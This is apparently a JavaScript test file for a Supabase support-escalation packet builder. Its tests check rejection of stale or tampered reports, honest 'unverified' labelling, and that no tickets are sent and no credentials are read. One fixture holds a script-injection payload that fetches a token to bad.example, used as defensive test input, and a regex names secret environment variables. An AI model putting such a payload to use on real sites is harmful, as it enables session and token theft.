import test from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import {buildSupabaseSupportPacket} from '../src/v259-support-escalation.mjs';
import {assessRecoveryTriage} from '../src/read-only-recovery-triage.mjs';
const now=Date.parse('2026-10-23T18:15:00.000Z');
const time=t=>new Date(t).toISOString();
const report=()=>assessRecoveryTriage({
 auth:{transport:'TIMEOUT',status:0},
 rest:{transport:'HTTP_RESPONSE',status:401},
 readiness:{transport:'HTTP_RESPONSE',status:200,data:{
  ok:true,state:'BUILD_HOLD',generated_at:time(now-3000),
  database_incident:{active:true,code:'POSTGREST_RUNTIME_UNAVAILABLE'},
  hard_blockers:['database_incident','auth_runtime','billing_preflight']}
}},now);
test('a current read-only incident produces the correct support handoff with no ticket creation',()=>{
 const p=buildSupabaseSupportPacket(report(),now);
 assert.ok(p);
 assert.match(p.title,/Supabase eu-west-1 connectivity/);
 assert.match(p.message,/2026-10-23T18:15:00.000Z/);
 assert.match(p.message,/Auth HTTP transport: TIMEOUT/);
 assert.match(p.message,/PostgREST HTTP transport: HTTP ERROR \(HTTP 401\)/);
 assert.match(p.message,/Database incident: REPORTED/);
 assert.match(p.message,/POSTGREST_RUNTIME_UNAVAILABLE/);
 assert.match(p.message,/EAUTHQUERY/);
 assert.match(p.message,/pg_cron/);
 assert.match(p.message,/PGRST003/);
 assert.match(p.message,/2026-10-24/);
 assert.match(p.message,/static historical operator evidence, not a live log query/);
 assert.match(p.message,/docs\/operations\/2026-10-24-v267-p0-database-incident\.md/);
 assert.match(p.message,/PLEASE/i); // see explicit provider response request wording
 assert.equal(p.provider_ticket_created,false);
 assert.equal(p.credentials_included,false);
 assert.equal(p.capital_permission,'0R');
 assert.equal(p.commercial_launch_certified,false);
});
test('unverified, stale, false execution and wrong-version reports cannot be copied',()=>{
 const d=report();
 for(const p of [
  null,{}, {...d,ok:false},{...d,version:'v999'},
  {...d,private_actions_executed:1},{...d,database_jobs_modified:2},
  {...d,governance:{...d.governance,capital_permission:'1R'}},
  {...d,governance:{...d.governance,commercial_launch_certified:true}},
  {...d,generated_at:time(now-301000)}, {...d,generated_at:'2050-01-01'}
 ])assert.equal(buildSupabaseSupportPacket(p,now),null);
});
test('no arbitrary remote strings are interpolated, even when hostile HTML appears',()=>{
 const d=report();
 const injected='<script>fetch("https://bad.example/steal?token=PRIVATE_SECRET")</script>';
 const modified={...d,
  checks:{...d.checks,
   database_incident_code:injected,
   blockers:['auth_runtime',injected,'billing_preflight'],
   auth_http:{...d.checks.auth_http,state:injected},
   postgrest_http:{...d.checks.postgrest_http,http_status:9999}},
  detail:injected,
  title:injected
 };
 const message=buildSupabaseSupportPacket(modified,now)?.message;
 assert.ok(message);
 assert.doesNotMatch(message,/bad\.example|PRIVATE_SECRET|<script>|token=/);
 assert.match(message,/NOT VERIFIED/);
 assert.match(message,/Reported blockers: auth_runtime, billing_preflight/);
});
test('fresh transport responses do not mean SQL or signed-in login certification',()=>{
 const d=report();
 const altered={...d,checks:{...d.checks,
  auth_http:{state:'HTTP RESPONDED',http_status:200},
  postgrest_http:{state:'HTTP RESPONDED',http_status:200}}};
 const p=buildSupabaseSupportPacket(altered,now);
 assert.match(p.message,/HTTP reachability does not establish a successful login or SQL query/);
 assert.equal(p.commercial_launch_certified,false);
});
test('incident absence is clearly labeled without fabricating a confirmed source',()=>{
 const d=report();
 const altered={...d,checks:{...d.checks,
  readiness_source_current:false,database_incident_reported:false,
  database_incident_code:null,
  blockers:['database_incident']}};
 const p=buildSupabaseSupportPacket(altered,now);
 assert.match(p.message,/Public incident response: UNVERIFIED/);
 assert.match(p.message,/Database incident: NOT VERIFIED AS CURRENT/);
 assert.match(p.message,/Reported blockers: UNVERIFIED/);
});
test('code does not submit support tickets or access user credentials',()=>{
 const src=readFileSync(new URL('../src/v259-support-escalation.mjs',import.meta.url),'utf8');
 const ui=readFileSync(new URL('../src/status.ts',import.meta.url),'utf8');
 const html=readFileSync(new URL('../status/index.html',import.meta.url),'utf8');
 assert.match(html,/support-escalation-prepare/);
 assert.match(html,/No ticket is sent automatically/);
 assert.match(ui,/navigator\.clipboard\?\.writeText/);
 assert.match(ui,/buildSupabaseSupportPacket\(latestRecoveryForSupport\)/);
 assert.match(ui,/if\(supportButton\)supportButton.disabled=true/);
 assert.doesNotMatch(src+ui,/fetch\(['"]https:\/\/supabase\.com\/dashboard\/support|createIssue\(|createTicket\(|SUPABASE_SERVICE_ROLE|DATABASE_URL|process\.env\.DB_PASS/);
});
